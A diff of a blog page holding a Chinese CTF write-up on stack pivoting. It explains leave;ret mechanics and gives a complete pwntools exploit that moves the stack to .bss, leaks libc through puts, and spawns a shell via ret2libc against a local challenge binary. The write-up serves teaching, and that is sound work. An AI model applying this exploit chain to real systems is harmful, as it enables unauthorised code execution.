@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
-  <link rel="icon" href="/img/666.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/roxy.jpg">
+  <link rel="icon" href="/img/roxy.jpg">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -281,42 +281,34 @@
 <p>来看看吧!</p>
 <p>题目逻辑非常之简单</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  undefined1 local_58 [<span class="hljs-number">80</span>];<br>  <br>  init(param_1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xswlhhh!Use stack hijacking on him!&quot;</span>);<br>  read(<span class="hljs-number">0</span>,local_58,<span class="hljs-number">0x60</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>题目的保护只有<code>NX</code></p>
 <p>但是这在当时对于只会无脑溢出覆盖返回地址的我来说宛如噩梦，设置了local_58[80]，然而read只有0x60的大小，也就是说算上<code>saved rbp</code>只剩下最后的8个字节供我覆盖rip，而题目又有<code>NX</code>，长度完全不够执行rop链!怎么办呢?我查询资料，得知存在一种技术叫做:<code>栈迁移(stack pivot)</code></p>
 <p>原理在于，将<code>saved rbp</code>覆盖为你想让rbp去的地方，将rip覆盖为再执行一次read的地址，因此执行逻辑便变为，main函数结束后，即将退出，执行<code>leave; ret;</code>的指令，而<code>saved rbp</code>已经被设置为我们想让它去的地方(通常是一个可读可写的地址段)，rip又一次执行read，最后在那个段空间重新分配一个新的栈帧，供我们自由发挥</p>
 <p>这里有一些前置知识需要理解，当时困扰了我许久，现在写下来，首先是<code>leave; ret;</code>干了什么，你可以将其理解为两个阶段，先是leave，其相当于<code>mov rsp,rbp</code>和<code>pop rbp</code>，注意，最后，<code>rsp += 8</code>，然后执行<code>ret</code>指令，相当于<code>rip = *rsp</code>，注意，同样，<code>rsp += 8</code>，接下来，如何理解栈帧?其实cpu并不在乎rbp在哪里，它只关心执行流要干什么事儿</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">LEA RAX =&gt; local_58,[RBP + -0x50]<br></code></pre></td></tr></table></figure>
-
 <p>read始于local_58[80]的地址，local_58[80]这个数组始终位于<code>rbp - 0x50</code>的位置，而<code>rbp + 0x8</code>的位置便是<code>rip</code>，栈帧布局永远如此，无论rbp在哪里，因此给了我们伪造新栈帧的利用空间</p>
 <p>所以第一段payload如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)  <span class="hljs-comment">#相当于重新执行一次read</span><br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure>
-
 <p>这时一个新的栈帧在bss段中形成了</p>
 <p>我们在新的栈帧中有了充足的空间来写rop链，因此便十分<em>easy</em>了，就打一个ret2libc吧，先来泄露libc基址</p>
 <p>payload如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure>
-
 <p>第一次看这个payload应该还是蛮懵的，不过对照着<code>leave; ret;</code>的含义在内存布局中多自己分析推导几遍便能理解其妙处所在，这里便不展开了</p>
 <p>大致画一下内存布局供你分析</p>
 <p><img src="/images/4.png" srcset="/img/loading.gif" lazyload alt="内存布局"></p>
 <p>接下来接收得到的puts真实地址并计算libc基址</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure>
-
 <p>注意上述payload执行完后我们又回到了main函数，此时rsp经过一系列弹栈，应该位于<code>0x404810</code>的位置，而main函数起始处的指令再次布置了栈帧</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov rbp,rsp<br>sub rsp,0x50<br></code></pre></td></tr></table></figure>
-
 <p>这段理解起来确实比较复杂，还是那句话，多动手调试(善用你的gdb)，思考，分析<em>汇编</em>，<strong>rsp</strong>，<strong>rbp</strong>，<strong>rip</strong>，<em>内存</em>等的变化</p>
 <p>此时在新的栈帧上，类似于上面，我们布置我们的最终payload</p>
 <p>如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)  <span class="hljs-comment">#对齐!</span><br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure>
-
 <p>最后也是成功拿到shell</p>
-<p>如果你彻底理解了这道题目，并能完整推理一遍过程，恭喜你，大抵是彻底理解了<code>stack pivot</code>这门技术，接下来迎接你的即将是更为复杂的栈布局，你加油，我也加油…</p>
+<p>如果你彻底理解了这道题目，并能完整推理一遍过程，恭喜你，大抵是彻底理解了<code>stack pivot</code>这门技术，接下来迎接你的即将是更为复杂的栈布局，你加油，我也加油...</p>
 <p>最后补一下完整exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf =ELF(<span class="hljs-string">&quot;./pivot&quot;</span>,<span class="hljs-literal">False</span>) <span class="hljs-comment">#本地...</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,<span class="hljs-literal">False</span>)<br>context.binary = elf<br>sh = elf.process()<br><br>pop_rdi_ret = <span class="hljs-number">0x401225</span><br>leave_ret = <span class="hljs-number">0x40121b</span><br>ret = leave_ret + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br><br>payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)<br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
-
-<p>感谢阅读…</p>
+<p>感谢阅读...</p>
 <p>生活愉快!</p>
 
                 
@@ -546,7 +538,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-      <span class="footer-quote">No furry, no life!</span>
+      <span class="footer-quote">nice to meet you</span>
     </div>
   
   
